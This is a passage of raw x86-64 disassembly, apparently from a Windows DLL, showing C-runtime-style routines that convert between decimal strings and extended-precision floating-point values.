   18000da95:	7d ec                	jge    0x18000da83
   18000da97:	e9 91 fe ff ff       	jmp    0x18000d92d
   18000da9c:	4c 8b c7             	mov    %rdi,%r8
   18000da9f:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   18000daa5:	48 8b 45 97          	mov    -0x69(%rbp),%rax
   18000daa9:	4c 89 00             	mov    %r8,(%rax)
   18000daac:	45 85 ff             	test   %r15d,%r15d
   18000daaf:	0f 84 13 04 00 00    	je     0x18000dec8
   18000dab5:	41 83 fb 18          	cmp    $0x18,%r11d
   18000dab9:	76 19                	jbe    0x18000dad4
   18000dabb:	8a 45 f6             	mov    -0xa(%rbp),%al
   18000dabe:	3c 05                	cmp    $0x5,%al
   18000dac0:	7c 06                	jl     0x18000dac8
   18000dac2:	41 02 c1             	add    %r9b,%al
   18000dac5:	88 45 f6             	mov    %al,-0xa(%rbp)
   18000dac8:	4d 2b d1             	sub    %r9,%r10
   18000dacb:	41 bb 18 00 00 00    	mov    $0x18,%r11d
   18000dad1:	41 03 f1             	add    %r9d,%esi
   18000dad4:	45 85 db             	test   %r11d,%r11d
   18000dad7:	75 15                	jne    0x18000daee
   18000dad9:	0f b7 d3             	movzwl %bx,%edx
   18000dadc:	0f b7 c3             	movzwl %bx,%eax
   18000dadf:	8b fb                	mov    %ebx,%edi
   18000dae1:	8b cb                	mov    %ebx,%ecx
   18000dae3:	e9 ef 03 00 00       	jmp    0x18000ded7
   18000dae8:	41 ff cb             	dec    %r11d
   18000daeb:	41 03 f1             	add    %r9d,%esi
   18000daee:	4d 2b d1             	sub    %r9,%r10
   18000daf1:	41 38 1a             	cmp    %bl,(%r10)
   18000daf4:	74 f2                	je     0x18000dae8
   18000daf6:	4c 8d 45 bf          	lea    -0x41(%rbp),%r8
   18000dafa:	48 8d 4d df          	lea    -0x21(%rbp),%rcx
   18000dafe:	41 8b d3             	mov    %r11d,%edx
   18000db01:	e8 6e 12 00 00       	call   0x18000ed74
   18000db06:	39 5d 8b             	cmp    %ebx,-0x75(%rbp)
   18000db09:	7d 03                	jge    0x18000db0e
   18000db0b:	41 f7 dd             	neg    %r13d
   18000db0e:	44 03 ee             	add    %esi,%r13d
   18000db11:	45 85 e4             	test   %r12d,%r12d
   18000db14:	75 04                	jne    0x18000db1a
   18000db16:	44 03 6d 67          	add    0x67(%rbp),%r13d
   18000db1a:	39 5d 87             	cmp    %ebx,-0x79(%rbp)
   18000db1d:	75 04                	jne    0x18000db23
   18000db1f:	44 2b 6d 6f          	sub    0x6f(%rbp),%r13d
   18000db23:	41 81 fd 50 14 00 00 	cmp    $0x1450,%r13d
   18000db2a:	0f 8f 82 03 00 00    	jg     0x18000deb2
   18000db30:	41 81 fd b0 eb ff ff 	cmp    $0xffffebb0,%r13d
   18000db37:	0f 8c 65 03 00 00    	jl     0x18000dea2
   18000db3d:	48 8d 35 ac c9 00 00 	lea    0xc9ac(%rip),%rsi        # 0x18001a4f0
   18000db44:	48 83 ee 60          	sub    $0x60,%rsi
   18000db48:	45 85 ed             	test   %r13d,%r13d
   18000db4b:	0f 84 3f 03 00 00    	je     0x18000de90
   18000db51:	79 0e                	jns    0x18000db61
   18000db53:	48 8d 35 f6 ca 00 00 	lea    0xcaf6(%rip),%rsi        # 0x18001a650
   18000db5a:	41 f7 dd             	neg    %r13d
   18000db5d:	48 83 ee 60          	sub    $0x60,%rsi
   18000db61:	39 5d 93             	cmp    %ebx,-0x6d(%rbp)
   18000db64:	75 04                	jne    0x18000db6a
   18000db66:	66 89 5d bf          	mov    %bx,-0x41(%rbp)
   18000db6a:	45 85 ed             	test   %r13d,%r13d
   18000db6d:	0f 84 1d 03 00 00    	je     0x18000de90
   18000db73:	bf 00 00 00 80       	mov    $0x80000000,%edi
   18000db78:	41 b9 ff 7f 00 00    	mov    $0x7fff,%r9d
   18000db7e:	41 8b c5             	mov    %r13d,%eax
   18000db81:	48 83 c6 54          	add    $0x54,%rsi
   18000db85:	41 c1 fd 03          	sar    $0x3,%r13d
   18000db89:	48 89 75 9f          	mov    %rsi,-0x61(%rbp)
   18000db8d:	83 e0 07             	and    $0x7,%eax
   18000db90:	0f 84 f1 02 00 00    	je     0x18000de87
   18000db96:	48 98                	cltq
   18000db98:	41 bb 00 80 00 00    	mov    $0x8000,%r11d
   18000db9e:	41 be 01 00 00 00    	mov    $0x1,%r14d
   18000dba4:	48 8d 0c 40          	lea    (%rax,%rax,2),%rcx
   18000dba8:	48 8d 14 8e          	lea    (%rsi,%rcx,4),%rdx
   18000dbac:	48 89 55 97          	mov    %rdx,-0x69(%rbp)
   18000dbb0:	66 44 39 1a          	cmp    %r11w,(%rdx)
   18000dbb4:	72 25                	jb     0x18000dbdb
   18000dbb6:	8b 42 08             	mov    0x8(%rdx),%eax
   18000dbb9:	f2 0f 10 02          	movsd  (%rdx),%xmm0
   18000dbbd:	48 8d 55 cf          	lea    -0x31(%rbp),%rdx
   18000dbc1:	89 45 d7             	mov    %eax,-0x29(%rbp)
   18000dbc4:	f2 0f 11 45 cf       	movsd  %xmm0,-0x31(%rbp)
   18000dbc9:	48 8b 45 cf          	mov    -0x31(%rbp),%rax
   18000dbcd:	48 c1 e8 10          	shr    $0x10,%rax
   18000dbd1:	48 89 55 97          	mov    %rdx,-0x69(%rbp)
   18000dbd5:	41 2b c6             	sub    %r14d,%eax
   18000dbd8:	89 45 d1             	mov    %eax,-0x2f(%rbp)
   18000dbdb:	0f b7 42 0a          	movzwl 0xa(%rdx),%eax
   18000dbdf:	0f b7 4d c9          	movzwl -0x37(%rbp),%ecx
   18000dbe3:	48 89 5d af          	mov    %rbx,-0x51(%rbp)
   18000dbe7:	44 0f b7 e0          	movzwl %ax,%r12d
   18000dbeb:	66 41 23 c1          	and    %r9w,%ax
   18000dbef:	89 5d b7             	mov    %ebx,-0x49(%rbp)
   18000dbf2:	66 44 33 e1          	xor    %cx,%r12w
   18000dbf6:	66 41 23 c9          	and    %r9w,%cx
   18000dbfa:	66 45 23 e3          	and    %r11w,%r12w
   18000dbfe:	44 8d 04 01          	lea    (%rcx,%rax,1),%r8d
   18000dc02:	66 41 3b c9          	cmp    %r9w,%cx
   18000dc06:	0f 83 67 02 00 00    	jae    0x18000de73
   18000dc0c:	66 41 3b c1          	cmp    %r9w,%ax
   18000dc10:	0f 83 5d 02 00 00    	jae    0x18000de73
   18000dc16:	41 ba fd bf 00 00    	mov    $0xbffd,%r10d
   18000dc1c:	66 45 3b c2          	cmp    %r10w,%r8w
   18000dc20:	0f 87 4d 02 00 00    	ja     0x18000de73
   18000dc26:	41 ba bf 3f 00 00    	mov    $0x3fbf,%r10d
   18000dc2c:	66 45 3b c2          	cmp    %r10w,%r8w
   18000dc30:	77 0c                	ja     0x18000dc3e
   18000dc32:	48 89 5d c3          	mov    %rbx,-0x3d(%rbp)
   18000dc36:	89 5d bf             	mov    %ebx,-0x41(%rbp)
   18000dc39:	e9 49 02 00 00       	jmp    0x18000de87
   18000dc3e:	66 85 c9             	test   %cx,%cx
   18000dc41:	75 20                	jne    0x18000dc63
   18000dc43:	66 45 03 c6          	add    %r14w,%r8w
   18000dc47:	f7 45 c7 ff ff ff 7f 	testl  $0x7fffffff,-0x39(%rbp)
   18000dc4e:	75 13                	jne    0x18000dc63
   18000dc50:	39 5d c3             	cmp    %ebx,-0x3d(%rbp)
   18000dc53:	75 0e                	jne    0x18000dc63
   18000dc55:	39 5d bf             	cmp    %ebx,-0x41(%rbp)
   18000dc58:	75 09                	jne    0x18000dc63
   18000dc5a:	66 89 5d c9          	mov    %bx,-0x37(%rbp)
   18000dc5e:	e9 24 02 00 00       	jmp    0x18000de87
   18000dc63:	66 85 c0             	test   %ax,%ax
   18000dc66:	75 16                	jne    0x18000dc7e
   18000dc68:	66 45 03 c6          	add    %r14w,%r8w
   18000dc6c:	f7 42 08 ff ff ff 7f 	testl  $0x7fffffff,0x8(%rdx)
   18000dc73:	75 09                	jne    0x18000dc7e
   18000dc75:	39 5a 04             	cmp    %ebx,0x4(%rdx)
   18000dc78:	75 04                	jne    0x18000dc7e
   18000dc7a:	39 1a                	cmp    %ebx,(%rdx)
   18000dc7c:	74 b4                	je     0x18000dc32
   18000dc7e:	44 8b fb             	mov    %ebx,%r15d
   18000dc81:	4c 8d 4d af          	lea    -0x51(%rbp),%r9
   18000dc85:	41 ba 05 00 00 00    	mov    $0x5,%r10d
   18000dc8b:	44 89 55 87          	mov    %r10d,-0x79(%rbp)
   18000dc8f:	45 85 d2             	test   %r10d,%r10d
   18000dc92:	7e 6c                	jle    0x18000dd00
   18000dc94:	43 8d 04 3f          	lea    (%r15,%r15,1),%eax
   18000dc98:	48 8d 7d bf          	lea    -0x41(%rbp),%rdi
   18000dc9c:	48 8d 72 08          	lea    0x8(%rdx),%rsi
   18000dca0:	48 63 c8             	movslq %eax,%rcx
   18000dca3:	41 8b c7             	mov    %r15d,%eax
   18000dca6:	41 23 c6             	and    %r14d,%eax
   18000dca9:	48 03 f9             	add    %rcx,%rdi
   18000dcac:	8b d0                	mov    %eax,%edx
   18000dcae:	0f b7 07             	movzwl (%rdi),%eax
   18000dcb1:	0f b7 0e             	movzwl (%rsi),%ecx
   18000dcb4:	44 8b db             	mov    %ebx,%r11d
   18000dcb7:	0f af c8             	imul   %eax,%ecx
   18000dcba:	41 8b 01             	mov    (%r9),%eax
   18000dcbd:	44 8d 34 08          	lea    (%rax,%rcx,1),%r14d
   18000dcc1:	44 3b f0             	cmp    %eax,%r14d
   18000dcc4:	72 05                	jb     0x18000dccb
   18000dcc6:	44 3b f1             	cmp    %ecx,%r14d
   18000dcc9:	73 06                	jae    0x18000dcd1
   18000dccb:	41 bb 01 00 00 00    	mov    $0x1,%r11d
   18000dcd1:	45 89 31             	mov    %r14d,(%r9)
   18000dcd4:	41 be 01 00 00 00    	mov    $0x1,%r14d
   18000dcda:	45 85 db             	test   %r11d,%r11d
   18000dcdd:	74 05                	je     0x18000dce4
   18000dcdf:	66 45 01 71 04       	add    %r14w,0x4(%r9)
   18000dce4:	44 8b 5d 87          	mov    -0x79(%rbp),%r11d
   18000dce8:	48 83 c7 02          	add    $0x2,%rdi
   18000dcec:	48 83 ee 02          	sub    $0x2,%rsi
   18000dcf0:	45 2b de             	sub    %r14d,%r11d
   18000dcf3:	44 89 5d 87          	mov    %r11d,-0x79(%rbp)
   18000dcf7:	45 85 db             	test   %r11d,%r11d
   18000dcfa:	7f b2                	jg     0x18000dcae
   18000dcfc:	48 8b 55 97          	mov    -0x69(%rbp),%rdx
   18000dd00:	45 2b d6             	sub    %r14d,%r10d
   18000dd03:	49 83 c1 02          	add    $0x2,%r9
   18000dd07:	45 03 fe             	add    %r14d,%r15d
   18000dd0a:	45 85 d2             	test   %r10d,%r10d
   18000dd0d:	0f 8f 78 ff ff ff    	jg     0x18000dc8b
   18000dd13:	44 8b 55 b7          	mov    -0x49(%rbp),%r10d
   18000dd17:	44 8b 4d af          	mov    -0x51(%rbp),%r9d
   18000dd1b:	b8 02 c0 00 00       	mov    $0xc002,%eax
   18000dd20:	66 44 03 c0          	add    %ax,%r8w
   18000dd24:	bf 00 00 00 80       	mov    $0x80000000,%edi
   18000dd29:	41 bf ff ff 00 00    	mov    $0xffff,%r15d
   18000dd2f:	66 45 85 c0          	test   %r8w,%r8w
   18000dd33:	7e 3f                	jle    0x18000dd74
   18000dd35:	44 85 d7             	test   %r10d,%edi
   18000dd38:	75 34                	jne    0x18000dd6e
   18000dd3a:	44 8b 5d b3          	mov    -0x4d(%rbp),%r11d
   18000dd3e:	41 8b d1             	mov    %r9d,%edx
   18000dd41:	45 03 d2             	add    %r10d,%r10d
   18000dd44:	c1 ea 1f             	shr    $0x1f,%edx
   18000dd47:	45 03 c9             	add    %r9d,%r9d
   18000dd4a:	41 8b cb             	mov    %r11d,%ecx
   18000dd4d:	c1 e9 1f             	shr    $0x1f,%ecx
   18000dd50:	43 8d 04 1b          	lea    (%r11,%r11,1),%eax
   18000dd54:	66 45 03 c7          	add    %r15w,%r8w
   18000dd58:	0b c2                	or     %edx,%eax
   18000dd5a:	44 0b d1             	or     %ecx,%r10d
   18000dd5d:	44 89 4d af          	mov    %r9d,-0x51(%rbp)
   18000dd61:	89 45 b3             	mov    %eax,-0x4d(%rbp)
   18000dd64:	44 89 55 b7          	mov    %r10d,-0x49(%rbp)
   18000dd68:	66 45 85 c0          	test   %r8w,%r8w
   18000dd6c:	7f c7                	jg     0x18000dd35
   18000dd6e:	66 45 85 c0          	test   %r8w,%r8w
   18000dd72:	7f 6a                	jg     0x18000ddde
   18000dd74:	66 45 03 c7          	add    %r15w,%r8w
   18000dd78:	79 64                	jns    0x18000ddde
   18000dd7a:	41 0f b7 c0          	movzwl %r8w,%eax
   18000dd7e:	8b fb                	mov    %ebx,%edi
   18000dd80:	66 f7 d8             	neg    %ax
   18000dd83:	0f b7 d0             	movzwl %ax,%edx
   18000dd86:	66 44 03 c2          	add    %dx,%r8w
   18000dd8a:	44 84 75 af          	test   %r14b,-0x51(%rbp)
   18000dd8e:	74 03                	je     0x18000dd93
   18000dd90:	41 03 fe             	add    %r14d,%edi
   18000dd93:	44 8b 5d b3          	mov    -0x4d(%rbp),%r11d
   18000dd97:	41 8b c2             	mov    %r10d,%eax
   18000dd9a:	41 d1 e9             	shr    $1,%r9d
   18000dd9d:	41 8b cb             	mov    %r11d,%ecx
   18000dda0:	c1 e0 1f             	shl    $0x1f,%eax
   18000dda3:	41 d1 eb             	shr    $1,%r11d
   18000dda6:	c1 e1 1f             	shl    $0x1f,%ecx
   18000dda9:	44 0b d8             	or     %eax,%r11d
   18000ddac:	41 d1 ea             	shr    $1,%r10d
   18000ddaf:	44 0b c9             	or     %ecx,%r9d
   18000ddb2:	44 89 5d b3          	mov    %r11d,-0x4d(%rbp)
   18000ddb6:	44 89 4d af          	mov    %r9d,-0x51(%rbp)
   18000ddba:	49 2b d6             	sub    %r14,%rdx
   18000ddbd:	75 cb                	jne    0x18000dd8a
   18000ddbf:	85 ff                	test   %edi,%edi
   18000ddc1:	44 89 55 b7          	mov    %r10d,-0x49(%rbp)
   18000ddc5:	bf 00 00 00 80       	mov    $0x80000000,%edi
   18000ddca:	74 12                	je     0x18000ddde
   18000ddcc:	41 0f b7 c1          	movzwl %r9w,%eax
   18000ddd0:	66 41 0b c6          	or     %r14w,%ax
   18000ddd4:	66 89 45 af          	mov    %ax,-0x51(%rbp)
   18000ddd8:	44 8b 4d af          	mov    -0x51(%rbp),%r9d
   18000dddc:	eb 04                	jmp    0x18000dde2
   18000ddde:	0f b7 45 af          	movzwl -0x51(%rbp),%eax
   18000dde2:	48 8b 75 9f          	mov    -0x61(%rbp),%rsi
   18000dde6:	41 bb 00 80 00 00    	mov    $0x8000,%r11d
   18000ddec:	66 41 3b c3          	cmp    %r11w,%ax
   18000ddf0:	77 10                	ja     0x18000de02
   18000ddf2:	41 81 e1 ff ff 01 00 	and    $0x1ffff,%r9d
   18000ddf9:	41 81 f9 00 80 01 00 	cmp    $0x18000,%r9d
   18000de00:	75 48                	jne    0x18000de4a
   18000de02:	8b 45 b1             	mov    -0x4f(%rbp),%eax
   18000de05:	83 c9 ff             	or     $0xffffffff,%ecx
   18000de08:	3b c1                	cmp    %ecx,%eax
   18000de0a:	75 38                	jne    0x18000de44
   18000de0c:	8b 45 b5             	mov    -0x4b(%rbp),%eax
   18000de0f:	89 5d b1             	mov    %ebx,-0x4f(%rbp)
   18000de12:	3b c1                	cmp    %ecx,%eax
   18000de14:	75 22                	jne    0x18000de38
   18000de16:	0f b7 45 b9          	movzwl -0x47(%rbp),%eax
   18000de1a:	89 5d b5             	mov    %ebx,-0x4b(%rbp)
   18000de1d:	66 41 3b c7          	cmp    %r15w,%ax
   18000de21:	75 0b                	jne    0x18000de2e
   18000de23:	66 44 89 5d b9       	mov    %r11w,-0x47(%rbp)
   18000de28:	66 45 03 c6          	add    %r14w,%r8w
   18000de2c:	eb 10                	jmp    0x18000de3e
   18000de2e:	66 41 03 c6          	add    %r14w,%ax
   18000de32:	66 89 45 b9          	mov    %ax,-0x47(%rbp)
   18000de36:	eb 06                	jmp    0x18000de3e
   18000de38:	41 03 c6             	add    %r14d,%eax
   18000de3b:	89 45 b5             	mov    %eax,-0x4b(%rbp)
   18000de3e:	44 8b 55 b7          	mov    -0x49(%rbp),%r10d
   18000de42:	eb 06                	jmp    0x18000de4a
   18000de44:	41 03 c6             	add    %r14d,%eax
   18000de47:	89 45 b1             	mov    %eax,-0x4f(%rbp)
   18000de4a:	41 b9 ff 7f 00 00    	mov    $0x7fff,%r9d
   18000de50:	66 45 3b c1          	cmp    %r9w,%r8w
   18000de54:	73 1d                	jae    0x18000de73
   18000de56:	0f b7 45 b1          	movzwl -0x4f(%rbp),%eax
   18000de5a:	66 45 0b c4          	or     %r12w,%r8w
   18000de5e:	44 89 55 c5          	mov    %r10d,-0x3b(%rbp)
   18000de62:	66 89 45 bf          	mov    %ax,-0x41(%rbp)
   18000de66:	8b 45 b3             	mov    -0x4d(%rbp),%eax
   18000de69:	66 44 89 45 c9       	mov    %r8w,-0x37(%rbp)
   18000de6e:	89 45 c1             	mov    %eax,-0x3f(%rbp)
   18000de71:	eb 14                	jmp    0x18000de87
   18000de73:	66 41 f7 dc          	neg    %r12w
   18000de77:	48 89 5d bf          	mov    %rbx,-0x41(%rbp)
   18000de7b:	1b c0                	sbb    %eax,%eax
   18000de7d:	23 c7                	and    %edi,%eax
   18000de7f:	05 00 80 ff 7f       	add    $0x7fff8000,%eax
   18000de84:	89 45 c7             	mov    %eax,-0x39(%rbp)
   18000de87:	45 85 ed             	test   %r13d,%r13d
   18000de8a:	0f 85 ee fc ff ff    	jne    0x18000db7e
   18000de90:	8b 45 c7             	mov    -0x39(%rbp),%eax
   18000de93:	0f b7 55 bf          	movzwl -0x41(%rbp),%edx
   18000de97:	8b 4d c1             	mov    -0x3f(%rbp),%ecx
   18000de9a:	8b 7d c5             	mov    -0x3b(%rbp),%edi
   18000de9d:	c1 e8 10             	shr    $0x10,%eax
   18000dea0:	eb 35                	jmp    0x18000ded7
   18000dea2:	8b d3                	mov    %ebx,%edx
   18000dea4:	0f b7 c3             	movzwl %bx,%eax
   18000dea7:	8b fb                	mov    %ebx,%edi
   18000dea9:	8b cb                	mov    %ebx,%ecx
   18000deab:	bb 01 00 00 00       	mov    $0x1,%ebx
   18000deb0:	eb 25                	jmp    0x18000ded7
   18000deb2:	8b cb                	mov    %ebx,%ecx
   18000deb4:	0f b7 d3             	movzwl %bx,%edx
   18000deb7:	b8 ff 7f 00 00       	mov    $0x7fff,%eax
   18000debc:	bb 02 00 00 00       	mov    $0x2,%ebx
   18000dec1:	bf 00 00 00 80       	mov    $0x80000000,%edi
   18000dec6:	eb 0f                	jmp    0x18000ded7
   18000dec8:	0f b7 d3             	movzwl %bx,%edx
   18000decb:	0f b7 c3             	movzwl %bx,%eax
   18000dece:	8b fb                	mov    %ebx,%edi
   18000ded0:	8b cb                	mov    %ebx,%ecx
   18000ded2:	bb 04 00 00 00       	mov    $0x4,%ebx
   18000ded7:	4c 8b 45 a7          	mov    -0x59(%rbp),%r8
   18000dedb:	66 0b 45 8f          	or     -0x71(%rbp),%ax
   18000dedf:	66 41 89 40 0a       	mov    %ax,0xa(%r8)
   18000dee4:	8b c3                	mov    %ebx,%eax
   18000dee6:	66 41 89 10          	mov    %dx,(%r8)
   18000deea:	41 89 48 02          	mov    %ecx,0x2(%r8)
   18000deee:	41 89 78 06          	mov    %edi,0x6(%r8)
   18000def2:	48 8b 4d ff          	mov    -0x1(%rbp),%rcx
   18000def6:	48 33 cc             	xor    %rsp,%rcx
   18000def9:	e8 32 73 ff ff       	call   0x180005230
   18000defe:	48 8b 9c 24 f0 00 00 	mov    0xf0(%rsp),%rbx
   18000df05:	00 
   18000df06:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   18000df0d:	41 5f                	pop    %r15
   18000df0f:	41 5e                	pop    %r14
   18000df11:	41 5d                	pop    %r13
   18000df13:	41 5c                	pop    %r12
   18000df15:	5f                   	pop    %rdi
   18000df16:	5e                   	pop    %rsi
   18000df17:	5d                   	pop    %rbp
   18000df18:	c3                   	ret
   18000df19:	cc                   	int3
   18000df1a:	cc                   	int3
   18000df1b:	cc                   	int3
   18000df1c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   18000df21:	55                   	push   %rbp
   18000df22:	56                   	push   %rsi
   18000df23:	57                   	push   %rdi
   18000df24:	41 54                	push   %r12
   18000df26:	41 55                	push   %r13
   18000df28:	41 56                	push   %r14
   18000df2a:	41 57                	push   %r15
   18000df2c:	48 8d 6c 24 d9       	lea    -0x27(%rsp),%rbp
   18000df31:	48 81 ec c0 00 00 00 	sub    $0xc0,%rsp
   18000df38:	48 8b 05 c1 b0 00 00 	mov    0xb0c1(%rip),%rax        # 0x180019000
   18000df3f:	48 33 c4             	xor    %rsp,%rax
   18000df42:	48 89 45 17          	mov    %rax,0x17(%rbp)
   18000df46:	44 0f b7 51 08       	movzwl 0x8(%rcx),%r10d
   18000df4b:	49 8b d9             	mov    %r9,%rbx
   18000df4e:	44 8b 09             	mov    (%rcx),%r9d
   18000df51:	89 55 b3             	mov    %edx,-0x4d(%rbp)
   18000df54:	ba 00 80 00 00       	mov    $0x8000,%edx
   18000df59:	41 bb 01 00 00 00    	mov    $0x1,%r11d
   18000df5f:	44 89 45 c7          	mov    %r8d,-0x39(%rbp)
   18000df63:	44 8b 41 04          	mov    0x4(%rcx),%r8d
   18000df67:	41 0f b7 ca          	movzwl %r10w,%ecx
   18000df6b:	66 23 ca             	and    %dx,%cx
   18000df6e:	44 8d 6a ff          	lea    -0x1(%rdx),%r13d
   18000df72:	41 8d 43 1f          	lea    0x1f(%r11),%eax
   18000df76:	45 33 e4             	xor    %r12d,%r12d
   18000df79:	66 45 23 d5          	and    %r13w,%r10w
   18000df7d:	48 89 5d bf          	mov    %rbx,-0x41(%rbp)
   18000df81:	c7 45 f7 cc cc cc cc 	movl   $0xcccccccc,-0x9(%rbp)
   18000df88:	c7 45 fb cc cc cc cc 	movl   $0xcccccccc,-0x5(%rbp)
   18000df8f:	c7 45 ff cc cc fb 3f 	movl   $0x3ffbcccc,-0x1(%rbp)
   18000df96:	66 89 4d 99          	mov    %cx,-0x67(%rbp)
   18000df9a:	8d 78 0d             	lea    0xd(%rax),%edi
   18000df9d:	66 85 c9             	test   %cx,%cx
   18000dfa0:	74 06                	je     0x18000dfa8
   18000dfa2:	40 88 7b 02          	mov    %dil,0x2(%rbx)
   18000dfa6:	eb 03                	jmp    0x18000dfab
   18000dfa8:	88 43 02             	mov    %al,0x2(%rbx)
   18000dfab:	66 45 85 d2          	test   %r10w,%r10w
   18000dfaf:	75 2e                	jne    0x18000dfdf
   18000dfb1:	45 85 c0             	test   %r8d,%r8d
   18000dfb4:	0f 85 f4 00 00 00    	jne    0x18000e0ae
   18000dfba:	45 85 c9             	test   %r9d,%r9d
   18000dfbd:	0f 85 eb 00 00 00    	jne    0x18000e0ae
   18000dfc3:	66 3b ca             	cmp    %dx,%cx
   18000dfc6:	0f 44 c7             	cmove  %edi,%eax
   18000dfc9:	66 44 89 23          	mov    %r12w,(%rbx)
   18000dfcd:	88 43 02             	mov    %al,0x2(%rbx)
   18000dfd0:	66 c7 43 03 01 30    	movw   $0x3001,0x3(%rbx)
   18000dfd6:	44 88 63 05          	mov    %r12b,0x5(%rbx)
   18000dfda:	e9 5b 09 00 00       	jmp    0x18000e93a
   18000dfdf:	66 45 3b d5          	cmp    %r13w,%r10w
   18000dfe3:	0f 85 c5 00 00 00    	jne    0x18000e0ae
   18000dfe9:	be 00 00 00 80       	mov    $0x80000000,%esi
   18000dfee:	66 44 89 1b          	mov    %r11w,(%rbx)
   18000dff2:	44 3b c6             	cmp    %esi,%r8d
   18000dff5:	75 05                	jne    0x18000dffc
   18000dff7:	45 85 c9             	test   %r9d,%r9d
   18000dffa:	74 29                	je     0x18000e025
   18000dffc:	41 0f ba e0 1e       	bt     $0x1e,%r8d
   18000e001:	72 22                	jb     0x18000e025
   18000e003:	48 8d 4b 04          	lea    0x4(%rbx),%rcx
   18000e007:	4c 8d 05 96 88 00 00 	lea    0x8896(%rip),%r8        # 0x1800168a4
   18000e00e:	ba 16 00 00 00       	mov    $0x16,%edx
   18000e013:	e8 04 75 ff ff       	call   0x18000551c
   18000e018:	85 c0                	test   %eax,%eax
   18000e01a:	0f 84 82 00 00 00    	je     0x18000e0a2
   18000e020:	e9 7b 09 00 00       	jmp    0x18000e9a0
   18000e025:	66 85 c9             	test   %cx,%cx
   18000e028:	74 2b                	je     0x18000e055
   18000e02a:	41 81 f8 00 00 00 c0 	cmp    $0xc0000000,%r8d
   18000e031:	75 22                	jne    0x18000e055
   18000e033:	45 85 c9             	test   %r9d,%r9d
   18000e036:	75 4d                	jne    0x18000e085
   18000e038:	48 8d 4b 04          	lea    0x4(%rbx),%rcx
   18000e03c:	4c 8d 05 69 88 00 00 	lea    0x8869(%rip),%r8        # 0x1800168ac
   18000e043:	41 8d 51 16          	lea    0x16(%r9),%edx
   18000e047:	e8 d0 74 ff ff       	call   0x18000551c
   18000e04c:	85 c0                	test   %eax,%eax
   18000e04e:	74 2b                	je     0x18000e07b
   18000e050:	e9 60 09 00 00       	jmp    0x18000e9b5
   18000e055:	44 3b c6             	cmp    %esi,%r8d
   18000e058:	75 2b                	jne    0x18000e085
   18000e05a:	45 85 c9             	test   %r9d,%r9d
   18000e05d:	75 26                	jne    0x18000e085
   18000e05f:	48 8d 4b 04          	lea    0x4(%rbx),%rcx
   18000e063:	4c 8d 05 4a 88 00 00 	lea    0x884a(%rip),%r8        # 0x1800168b4
   18000e06a:	41 8d 51 16          	lea    0x16(%r9),%edx
   18000e06e:	e8 a9 74 ff ff       	call   0x18000551c
   18000e073:	85 c0                	test   %eax,%eax
   18000e075:	0f 85 4f 09 00 00    	jne    0x18000e9ca
   18000e07b:	b8 05 00 00 00       	mov    $0x5,%eax
   18000e080:	88 43 03             	mov    %al,0x3(%rbx)
   18000e083:	eb 21                	jmp    0x18000e0a6
   18000e085:	48 8d 4b 04          	lea    0x4(%rbx),%rcx
   18000e089:	4c 8d 05 2c 88 00 00 	lea    0x882c(%rip),%r8        # 0x1800168bc
   18000e090:	ba 16 00 00 00       	mov    $0x16,%edx
   18000e095:	e8 82 74 ff ff       	call   0x18000551c
   18000e09a:	85 c0                	test   %eax,%eax
   18000e09c:	0f 85 3d 09 00 00    	jne    0x18000e9df
   18000e0a2:	c6 43 03 06          	movb   $0x6,0x3(%rbx)
   18000e0a6:	45 8b dc             	mov    %r12d,%r11d
   18000e0a9:	e9 8c 08 00 00       	jmp    0x18000e93a
   18000e0ae:	41 0f b7 d2          	movzwl %r10w,%edx
   18000e0b2:	44 89 4d e9          	mov    %r9d,-0x17(%rbp)
   18000e0b6:	66 44 89 55 f1       	mov    %r10w,-0xf(%rbp)
   18000e0bb:	41 8b c8             	mov    %r8d,%ecx
   18000e0be:	8b c2                	mov    %edx,%eax
   18000e0c0:	4c 8d 0d 29 c4 00 00 	lea    0xc429(%rip),%r9        # 0x18001a4f0
   18000e0c7:	c1 e9 18             	shr    $0x18,%ecx
   18000e0ca:	c1 e8 08             	shr    $0x8,%eax
   18000e0cd:	41 bf 00 00 00 80    	mov    $0x80000000,%r15d
   18000e0d3:	8d 04 48             	lea    (%rax,%rcx,2),%eax
   18000e0d6:	41 be 05 00 00 00    	mov    $0x5,%r14d
   18000e0dc:	49 83 e9 60          	sub    $0x60,%r9
   18000e0e0:	44 89 45 ed          	mov    %r8d,-0x13(%rbp)
   18000e0e4:	66 44 89 65 e7       	mov    %r12w,-0x19(%rbp)
   18000e0e9:	be fd bf 00 00       	mov    $0xbffd,%esi
   18000e0ee:	6b c8 4d             	imul   $0x4d,%eax,%ecx
   18000e0f1:	69 c2 10 4d 00 00    	imul   $0x4d10,%edx,%eax
   18000e0f7:	05 0c ed bc ec       	add    $0xecbced0c,%eax
   18000e0fc:	44 89 75 b7          	mov    %r14d,-0x49(%rbp)
   18000e100:	41 8d 7f ff          	lea    -0x1(%r15),%edi
   18000e104:	03 c8                	add    %eax,%ecx
   18000e106:	c1 f9 10             	sar    $0x10,%ecx
   18000e109:	44 0f bf d1          	movswl %cx,%r10d
   18000e10d:	89 4d 9f             	mov    %ecx,-0x61(%rbp)
   18000e110:	41 f7 da             	neg    %r10d
   18000e113:	0f 84 6f 03 00 00    	je     0x18000e488
   18000e119:	45 85 d2             	test   %r10d,%r10d
   18000e11c:	79 11                	jns    0x18000e12f
   18000e11e:	4c 8d 0d 2b c5 00 00 	lea    0xc52b(%rip),%r9        # 0x18001a650
   18000e125:	41 f7 da             	neg    %r10d
   18000e128:	49 83 e9 60          	sub    $0x60,%r9
   18000e12c:	45 85 d2             	test   %r10d,%r10d
   18000e12f:	0f 84 53 03 00 00    	je     0x18000e488
   18000e135:	44 8b 45 eb          	mov    -0x15(%rbp),%r8d
   18000e139:	8b 55 e7             	mov    -0x19(%rbp),%edx
   18000e13c:	41 8b c2             	mov    %r10d,%eax
   18000e13f:	49 83 c1 54          	add    $0x54,%r9
   18000e143:	41 c1 fa 03          	sar    $0x3,%r10d
   18000e147:	44 89 55 af          	mov    %r10d,-0x51(%rbp)
   18000e14b:	4c 89 4d a7          	mov    %r9,-0x59(%rbp)
   18000e14f:	83 e0 07             	and    $0x7,%eax
   18000e152:	0f 84 19 03 00 00    	je     0x18000e471
   18000e158:	48 98                	cltq
   18000e15a:	48 8d 0c 40          	lea    (%rax,%rax,2),%rcx
   18000e15e:	49 8d 34 89          	lea    (%r9,%rcx,4),%rsi
   18000e162:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
